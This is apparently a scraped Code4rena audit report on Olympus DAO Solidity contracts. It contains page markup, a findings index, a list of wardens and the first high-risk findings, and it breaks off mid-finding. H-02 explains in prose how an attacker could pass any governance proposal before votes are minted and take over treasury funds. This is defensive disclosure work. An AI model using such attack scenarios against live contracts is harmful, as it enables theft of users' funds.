style=\"position:relative;\"><a href=\"#g-15-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" aria-label=\"g 15 duplicated requirerevert checks should be refactored to a modifier or function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-15] Duplicated require()/revert() checks should be refactored to a modifier or function</h2>\n<p>Method Call Gas Saved: <strong>8 111</strong></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol\">src/modules/PRICE.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Price_NotInitialized</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// @note 4 instances</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/39\">0xLienid (Olympus) confirmed</a></strong></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-3\">High Risk Findings (3)</a></p>\n<ul>\n<li><a href=\"#h-01-in-governancesol-it-might-be-impossible-to-activate-a-new-proposal-forever-after-failed-to-execute-the-previous-active-proposal\">[H-01] In <code>Governance.sol</code>, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.</a></li>\n<li><a href=\"#h-02-anyone-can-pass-any-proposal-alone-before-first-votes-are-minted\">[H-02] Anyone can pass any proposal alone before first <code>VOTES</code> are minted</a></li>\n<li><a href=\"#h-03-trsry-front-runnable-setapprovalfor\">[H-03] TRSRY: front-runnable <code>setApprovalFor</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-32\">Medium Risk Findings (32)</a></p>\n<ul>\n<li><a href=\"#m-01-operatorsetreservefactor-doesnt-check-if-bond-market-should-be-changed\">[M-01] <code>Operator::setReserveFactor</code> doesn’t check if bond market should be changed</a></li>\n<li><a href=\"#m-02-solmate-safetransfer-and-safetransferfrom-does-not-check-the-codesize-of-the-token-address-which-may-lead-to-fund-loss\">[M-02] Solmate <code>safetransfer</code> and <code>safetransferfrom</code> does not check the codesize of the token address, which may lead to fund loss</a></li>\n<li><a href=\"#m-03-rbs-may-redeploy-funds-automatically-if-price-stays-above-or-below-wall-for-longer-than-_configregenwait\">[M-03] RBS may redeploy funds automatically if price stays above or below wall for longer than <code>_config.regenWait</code></a></li>\n<li><a href=\"#m-04-olympusgovernanceexecuteproposal-reentrancy-attack-vulnerable-function\">[M-04] <code>OlympusGovernance#executeProposal</code>: reentrancy attack vulnerable function</a></li>\n<li><a href=\"#m-05-proposals-overwrite\">[M-05] Proposals overwrite</a></li>\n<li><a href=\"#m-06-after-endorsing-a-proposal-user-can-transfer-votes-to-another-user-for-endorsing-the-same-proposal-again\">[M-06] After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again</a></li>\n<li><a href=\"#m-07-endorsed-votes-by-a-user-do-not-decrease-after-the-users-votes-are-revoked\">[M-07] Endorsed votes by a user do not decrease after the user’s votes are revoked</a></li>\n<li><a href=\"#m-08-twap-used-is-an-observation-weighted-average-price-not-a-time-weighted-one\">[M-08] “TWAP” used is an observation-weighted-average-price, not a time-weighted one</a></li>\n<li><a href=\"#m-09-activateproposal-need-time-delay\">[M-09] <code>activateProposal()</code> need time delay</a></li>\n<li><a href=\"#m-10-voted-votes-cannot-change-after-the-user-is-issued-new-votes-or-the-users-old-votes-are-revoked-during-voting\">[M-10] Voted votes cannot change after the user is issued new votes or the user’s old votes are revoked during voting</a></li>\n<li><a href=\"#m-11-olympusgovernance-users-can-prevent-their-votes-from-being-revoked\">[M-11] OlympusGovernance: Users can prevent their votes from being revoked</a></li>\n<li><a href=\"#m-12-griefingdos-of-withdrawals-by-eoas-from-treasury-trsry-possible\">[M-12] Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible</a></li>\n<li><a href=\"#m-13-missing-checks-in-kernel_deactivatepolicy\">[M-13] Missing checks in <code>Kernel._deactivatePolicy</code></a></li>\n<li><a href=\"#m-14-the-governance-system-can-be-held-hostage-by-a-malicious-user\">[M-14] The governance system can be held hostage by a malicious user</a></li>\n<li><a href=\"#m-15-heart-will-stop-if-all-rewards-are-swept\">[M-15] Heart will stop if all rewards are swept</a></li>\n<li><a href=\"#m-16-inconsistant-parameter-requirements-between-constructor-and-set-functions-in-rangesol-and-operatorsol\">[M-16] Inconsistant parameter requirements between <code>constructor()</code> and <code>Set() functions</code> in <code>RANGE.sol</code> and <code>Operator.sol</code>.</a></li>\n<li><a href=\"#m-17-no-cap-on-amount-of-votes-means-the-voter_admin-can-get-any-proposal-to-pass\">[M-17] No Cap on Amount of VOTES means the <code>voter_admin</code> can get any proposal to pass</a></li>\n<li><a href=\"#m-18-inconsistency-in-staleness-checks-between-ohm-and-reserve-token-oracles\">[M-18] Inconsistency in staleness checks between OHM and reserve token oracles</a></li>\n<li><a href=\"#m-19-trsry-reenter-from-olympustreasuryrepayloan-to-operatorswap\">[M-19] TRSRY: reenter from <code>OlympusTreasury::repayLoan</code> to <code>Operator::swap</code></a></li>\n<li><a href=\"#m-20-operator-if-wallspread-is-10000-operate-and-beat-will-revert-and-price-information-cannot-be-updated-anymore\">[M-20] Operator: if WallSpread is 10000, <code>operate</code> and <code>beat</code> will revert and price information cannot be updated anymore</a></li>\n<li><a href=\"#m-21-olympusgovernance---active-proposal-does-not-expire\">[M-21] OlympusGovernance - active proposal does not expire</a></li>\n<li><a href=\"#m-22-low-market-bondsswaps-not-working-after-loan-is-taken-from-treasury\">[M-22] Low market bonds/swaps not working after loan is taken from treasury</a></li>\n<li><a href=\"#m-23-treasury-module-is-vulnerable-to-cross-contract-reentrancy\">[M-23] Treasury module is vulnerable to cross-contract reentrancy</a></li>\n<li><a href=\"#m-24-naz-m1-chainlinks-latestrounddata-might-return-stale-results\">[M-24] [NAZ-M1] Chainlink’s <code>latestRoundData</code> Might Return Stale Results</a></li>\n<li><a href=\"#m-25-moving-average-precision-is-lost\">[M-25] Moving average precision is lost</a></li>\n<li><a href=\"#m-26-cushion-bond-markets-are-opened-at-wall-price-rather-than-current-price\">[M-26] Cushion bond markets are opened at wall price rather than current price</a></li>\n<li><a href=\"#m-27-unexecutable-proposals-when-actionsmigratekernel-is-not-last-instruction\">[M-27] Unexecutable proposals when <code>Actions.MigrateKernel</code> is not last instruction</a></li>\n<li><a href=\"#m-28-activating-same-policy-multiple-times-in-kernel-possible\">[M-28] Activating same Policy multiple times in Kernel possible</a></li>\n<li><a href=\"#m-29-trsry-susceptible-to-loan--withdraw-confusion\">[M-29] TRSRY susceptible to loan / withdraw confusion</a></li>\n<li><a href=\"#m-30-heartbeat-could-be-called-several-times-in-one-block-if-no-one-called-it-for-a-some-time\">[M-30] <code>Heart::beat()</code> could be called several times in one block if no one called it for a some time</a></li>\n<li><a href=\"#m-31-protocols-walls--cushion-bonds-remain-active-even-if-heart-is-not-beating\">[M-31] Protocol’s Walls / cushion bonds remain active even if heart is not beating</a></li>\n<li><a href=\"#m-32-admin-cannot-be-changed-to-eoa-after-deployment\">[M-32] Admin cannot be changed to EOA after deployment</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#l-01-operator-incorrect-accounting-for-fee-on-transfer-reserve-token\">L-01 Operator: incorrect accounting for fee-on-transfer reserve token</a></li>\n<li><a href=\"#l-02-bondcallback-incorrect-accounting-if-quotetoken-is-rebase-token\">L-02 BondCallback: incorrect accounting if quoteToken is rebase token</a></li>\n<li><a href=\"#l-03-price-unsafe-cast-for-numobservations\">L-03 PRICE: unsafe cast for <code>numObservations</code></a></li>\n<li><a href=\"#l-04-operator-unsafe-cast-for-decimals\">L-04 Operator: unsafe cast for decimals</a></li>\n<li><a href=\"#l-05-bondcallback-operator-is-not-set-constructor\">L-05 BondCallback: operator is not set <code>constructor</code></a></li>\n<li><a href=\"#l-06-operator-missing-check-for-configparmas0-cushionfactor-in-the-constructor\">L-06 Operator: missing check for configParmas[0] (cushionFactor) in the constructor</a></li>\n<li><a href=\"#l-07-kernel-misplaced-zero-address-check-for-changekernel\">L-07 Kernel: misplaced zero address check for <code>changeKernel</code></a></li>\n<li><a href=\"#l-08-bondcallback-operator-upon-modules-upgrade-the-token-approval-should-be-revoked\">L-08 BondCallback, Operator: upon module’s upgrade, the token approval should be revoked</a></li>\n<li><a href=\"#l-09-heart-if-the-issuereward-fails-the-heart-beat-will-revert\">L-09 Heart: if the issueReward fails the heart beat will revert</a></li>\n<li><a href=\"#n-01-kernel-missing-zero-address-check-for-executor-and-admin\">N-01 Kernel: missing zero address check for <code>executor</code> and <code>admin</code></a></li>\n<li><a href=\"#n-02-instr-governance-upon-modules-upgrade-all-instruction-data-should-be-carried-over-to-the-new-modules\">N-02 INSTR, Governance: upon module’s upgrade, all instruction data should be carried over to the new modules</a></li>\n<li><a href=\"#n-03-range-price-unused-import-of-fullmath\">N-03 RANGE, PRICE: unused import of <code>FullMath</code></a></li>\n<li><a href=\"#n-04-price-stale-price\">N-04 PRICE: stale price</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-2\">Summary</a></li>\n<li><a href=\"#g-01--replace-modifier-with-function-6-instances\">G-01  Replace <code>modifier</code> with <code>function</code> (6 instances)</a></li>\n<li><a href=\"#g-02--storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-7-instances\">G-02  <code>storage</code> pointer to a structure is cheaper than copying each value of the structure into <code>memory</code>, same for <code>array</code> and <code>mapping</code> (7 instances)</a></li>\n<li><a href=\"#g-03--using-private-rather-than-public-for-constants-saves-gas-8-instances\">G-03  Using <code>private</code> rather than <code>public</code> for constants, saves gas (8 instances)</a></li>\n<li><a href=\"#g-04-use-elementary-types-or-a-user-defined-type-instead-of-a-struct-that-has-only-one-member-1-instances\">G-04 Use elementary types or a user-defined <code>type</code> instead of a <code>struct</code> that has only one member (1 instances)</a></li>\n<li><a href=\"#g-05-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G-05 State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g-06--using-bools-for-storage-incurs-overhead-6-instances\">G-06  Using bools for storage incurs overhead (6 instances)</a></li>\n<li><a href=\"#g-07-state-variables-can-be-packed-into-fewer-storage-slots-3-instances\">G-07 State variables can be packed into fewer storage slots (3 instances)</a></li>\n<li><a href=\"#g-08-expressions-that-cannot-be-overflowed-can-be-unchecked-5-instances\">G-08 Expressions that cannot be overflowed can be unchecked (5 instances)</a></li>\n<li><a href=\"#g-09-increment-optimization-18-instances\">G-09 Increment optimization (18 instances)</a></li>\n<li><a href=\"#g-10-use-named-returns-for-local-variables-where-it-is-possible-3-instances\">G-10 Use named <code>returns</code> for local variables where it is possible (3 instances)</a></li>\n<li><a href=\"#g-11-x--x--y-is-cheaper-than-x--y-6-instances\">G-11 <code>x = x + y</code> is cheaper than <code>x += y;</code> (6 instances)</a></li>\n<li><a href=\"#g-12-deleting-a-struct-is-cheaper-than-creating-a-new-struct-with-null-values-1-instances\">G-12 Deleting a struct is cheaper than creating a new struct with null values. (1 instances)</a></li>\n<li><a href=\"#g-13-dont-compare-boolean-expressions-to-boolean-literals-2-instances\">G-13 Don’t compare boolean expressions to boolean literals (2 instances)</a></li>\n<li><a href=\"#g-14-revert-operator-should-be-in-the-code-as-early-as-reasonably-possible-3-instances\">G-14 <code>revert</code> operator should be in the code as early as reasonably possible (3 instances)</a></li>\n<li><a href=\"#g-15-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\">G-15 Duplicated require()/revert() checks should be refactored to a modifier or function</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Olympus DAO smart contract system written in Solidity. The audit contest took place between August 25—September 1 2022.\n\n## Wardens\n\n156 Wardens contributed reports to the Olympus DAO contest:\n\n  1. zzzitron\n  1. 0x52\n  1. [Trust](https://www.linkedin.com/in/or-cyngiser/)\n  1. rbserver\n  1. Lambda\n  1. enckrish\n  1. 0x1f8b\n  1. IllIllI\n  1. reassor\n  1. cryptphi\n  1. datapunk\n  1. rvierdiiev\n  1. Bahurum\n  1. minhtrng\n  1. immeas\n  1. [Czar102](https://twitter.com/_Czar102)\n  1. [bin2chen](https://twitter.com/bin2chen)\n  1. [csanuragjain](https://twitter.com/csanuragjain)\n  1. cccz\n  1. [hansfriese](https://twitter.com/hansfriese)\n  1. [Jeiwan](https://jeiwan.net)\n  1. [berndartmueller](https://twitter.com/berndartmueller)\n  1. [itsmeSTYJ](https://twitter.com/itsmeSTYJ)\n  1. brgltd\n  1. d3e4\n  1. djxploit\n  1. V&#95;B (Barichek and vlad&#95;bochok)\n  1. [GalloDaSballo](https://twitter.com/gallodasballo)\n  1. m9800\n  1. [Aymen0909](https://github.com/Aymen1001)\n  1. [hyh](https://twitter.com/0xhyh)\n  1. ladboy233\n  1. [carlitox477](https://twitter.com/CAA1994)\n  1. [0xNazgul](https://twitter.com/0xNazgul)\n  1. [Ruhum](https://twitter.com/0xruhum)\n  1. sorrynotsorry\n  1. [pedroais](https://twitter.com/Pedroais2/)\n  1. pashov\n  1. &#95;&#95;141345&#95;&#95;\n  1. [CertoraInc](https://twitter.com/CertoraInc) (egjlmn1, [OriDabush](https://twitter.com/ori_dabush), ItayG, shakedwinder, and RoiEvenHaim)\n  1. tonisives\n  1. 0xSky\n  1. PwnPatrol ([obront](https://twitter.com/zachobront) and [throttle](https://twitter.com/Throt7le))\n  1. okkothejawa\n  1. [pfapostol](https://t.me/pfahard)\n  1. [c3phas](https://twitter.com/c3ph_)\n  1. yixxas\n  1. [0xSmartContract](https://twitter.com/0xSmartContract)\n  1. [Guardian](https://twitter.com/GuardianAudits)\n  1. [devtooligan](https://twitter.com/devtooligan)\n  1. 0xNineDec\n  1. LeoS\n  1. [Tomo](https://tom-sol.notion.site/Who-am-I-3b4dc28e77b647eb90794735a94dd38e)\n  1. [Deivitto](https://twitter.com/Deivitto)\n  1. ReyAdmirado\n  1. [TomJ](https://mobile.twitter.com/tomj_bb)\n  1. [Sm4rty](https://twitter.com/Sm4rty_)\n  1. [gogo](https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219)\n  1. Rolezn\n  1. [ignacio](https://twitter.com/0xheynacho)\n  1. [ret2basic](https://twitter.com/ret2basic)\n  1. [oyc&#95;109](https://twitter.com/andyfeili)\n  1. ajtra\n  1. 0xDjango\n  1. Bnke0x0\n  1. [grGred](https://github.com/grGred)\n  1. robee\n  1. 0xkatana\n  1. [fatherOfBlocks](https://twitter.com/father0fBl0cks)\n  1. erictee\n  1. 0x040\n  1. [ElKu](https://twitter.com/ElKu_crypto)\n  1. cRat1st0s\n  1. [durianSausage](https://github.com/lyciumlee)\n  1. lukris02\n  1. [martin](https://github.com/martin-petrov03)\n  1. [Rohan16](https://twitter.com/ROHANJH56009256)\n  1. sikorico\n  1. tnevler\n  1. StevenL\n  1. RaymondFam\n  1. Waze\n  1. delfin454000\n  1. [medikko](https://twitter.com/mehmeddukov)\n  1. bobirichman\n  1. CodingNameKiki\n  1. [Chandr](https://www.linkedin.com/in/evgeniy-shaldin-21898712a/)\n  1. [rokinot](twitter.com/rokinot)\n  1. 0x85102\n  1. [aviggiano](https://twitter.com/agfviggiano)\n  1. apostle0x01\n  1. [Funen](https://instagram.com/vanensurya)\n  1. [natzuu](https://twitter.com/natzuu33)\n  1. The&#95;GUILD ([David&#95;](https://twitter.com/davidpius10), [Ephraim](https://twitter.com/iamephraim_js), LeoGold, and greatsamist)\n  1. [JansenC](https://www.linkedin.com/in/jansen-moreira/?locale&#x3D;en_US)\n  1. Diraco\n  1. ne0n\n  1. mics\n  1. ak1\n  1. [shenwilly](https://twitter.com/shenwilly_)\n  1. [m&#95;Rassska](https://t.me/Road220)\n  1. dipp\n  1. DimSon\n  1. nxrblsrpr\n  1. [BipinSah](https://twitter.com/BipinSah745)\n  1. [Ch&#95;301](https://twitter.com/0xch301)\n  1. [prasantgupta52](https://twitter.com/prasantgupta52)\n  1. w0Lfrum\n  1. [rajatbeladiya](https://twitter.com/rajat_beladiya)\n  1. [ch13fd357r0y3r](https://twitter.com/ch13fd357r0y3r)\n  1. PPrieditis\n  1. [Chom](https://chom.dev)\n  1. eierina\n  1. PaludoX0\n  1. [Picodes](https://twitter.com/thePicodes)\n  1. p&#95;crypt0\n  1. Margaret\n  1. [8olidity](https://twitter.com/8olidity)\n  1. EthLedger\n  1. [indijanc](https://twitter.com/krenkmet)\n  1. CRYP70\n  1. cloudjunky\n  1. MasterCookie\n  1. [JC](https://twitter.com/sm4rtcontr4ct)\n  1. exolorkistis\n  1. [zishansami](https://zishansami102.github.io/)\n  1. Dionysus\n  1. ch0bu\n  1. jag\n  1. Noah3o6\n  1. Saintcode&#95;\n  1. chrisdior4\n  1. Amithuddar\n  1. Shishigami\n  1. Metatron\n  1. RoiEvenHaim\n  1. peiw\n  1. karanctf\n  1. kris\n  1. simon135\n  1. Tagir2003\n  1. SooYa\n  1. newfork01\n  1. [Fitraldys](https://twitter.com/fitraldys)\n  1. [Dravee](https://twitter.com/BowTiedDravee)\n  1. Jujic\n  1. peachtea\n\nThis contest was judged by [0xean](https://github.com/0xean).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 35 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 32 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 114 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 91 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Olympus DAO contest repository](https://github.com/code-423n4/2022-08-olympus), and is composed of 18 smart contracts written in the Solidity programming language and includes 1,944 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (3)\n## [[H-01] In `Governance.sol`, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.](https://github.com/code-423n4/2022-08-olympus-findings/issues/376)\n_Submitted by hansfriese, also found by berndartmueller, csanuragjain, m9800, V&#95;B, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304>\n\nCurrently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.\n\nAnd the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.\n\nBut `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.\n\n### Proof of Concept\n\nThe below scenario would be possible.\n\n1.  `Proposal 1` was submitted and activated successfully.\n2.  Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%`\n3.  This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`.\n4.  Currently the contract contains more than 81% of total votes and users have at most 19% in total.\n5.  Also users can't reclaim their votes among 81% while `Proposal 1` is active.\n6.  So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221).\n7.  So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nI think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.\n\nI am not sure we can use the current `GRACE_PERIOD` for that purpose.\n\nSo `reclaimVotes()` should be modified like below.\n\n    function reclaimVotes(uint256 proposalId_) external {\n        uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];\n\n        if (userVotes == 0) {\n            revert CannotReclaimZeroVotes();\n        }\n\n        if (proposalId_ == activeProposal.proposalId) {\n            if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++\n            {\n                revert CannotReclaimTokensForActiveVote();\n            }\n        }\n\n        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {\n            revert VotingTokensAlreadyReclaimed();\n        }\n\n        tokenClaimsForProposal[proposalId_][msg.sender] = true;\n\n        VOTES.transferFrom(address(this), msg.sender, userVotes);\n    }\n\n**[fullyallocated (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/376)**\n\n\n\n***\n\n## [[H-02] Anyone can pass any proposal alone before first `VOTES` are minted](https://github.com/code-423n4/2022-08-olympus-findings/issues/392)\n_Submitted by Bahurum, also found by bin2chen and cryptphi_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268>\n\nBefore any `VOTES` are minted anyone can activate and execute an arbitrary proposal even with 0 votes cast. So an attacker can pass any proposal (i.e. change the `executor` + `admin` of the `Kernel`, gaining access to all permissioned functions and to funds held).\n\n### Proof of Concept\n\nChecks on vote numbers made in `Governance.sol` at lines [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164), [217-218](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-218), [268](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268) pass if `VOTES.totalSupply() == 0`. So, until no `VOTES` are minted, anyone can submit, activate and execute a proposal. There is no need to own or cast votes. This happens if `OlympusGovernance` is granted the `executor` role before any `VOTES` are minted (as in [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol)). The attacker can anticipate/frontrun the minting and pass a proposal to change both the `Kernel` `admin` and `executor`. Then he/she can upgrade malicious modules, steal funds from treasury...\n\nA PoC was obtained modifying the `setUp()` of [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol) by keeping only what is before the minting of `VOTES` (up to 